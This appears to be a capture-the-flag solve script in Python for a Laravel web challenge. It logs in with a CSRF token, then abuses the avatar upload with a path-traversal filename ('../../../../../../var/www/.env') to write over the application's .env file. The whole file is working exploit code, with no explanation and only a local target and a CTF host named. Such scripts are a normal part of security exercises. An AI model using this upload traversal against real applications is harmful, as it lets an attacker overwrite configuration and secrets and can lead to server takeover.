import requests, re

def get_csrf_token(string):
    pattern = r'<meta name="csrf-token" content="(.*?)">'
    a = re.findall(pattern,string)
    return a[0] if a else None
    
url = 'http://127.0.0.1:5000/'    
#url = 'https://8f9c95c1-73c5-47a5-8400-defac7713854.tamuctf.com/'

s = requests.Session()
r = s.get(url=url)
csrf_token = get_csrf_token(r.text)
data = {
    "username":"bbt",
    "password":"bbt",
    "_token":csrf_token
}

headers = {
    "XSRF-TOKEN":r.cookies.get('XSRF-TOKEN'),
    "laravel-session":r.cookies.get('laravel-session'),
    "Content-Type": "application/x-www-form-urlencoded"
}
r = s.post(url=url+'login',data=data, headers = headers)

csrf_token = get_csrf_token(r.text)
data = {
    "_token":csrf_token
}
files = {
    "avatar": ('../../../../../../var/www/.env',open('react2shell flag.png','rb'), 'image/png')
}
headers = {
    "XSRF-TOKEN":r.cookies.get('XSRF-TOKEN'),
    "laravel-session":r.cookies.get('laravel-session'),
}
r = s.post(url=url+'account/avatar',data=data,headers=headers,files=files)
print(r.text)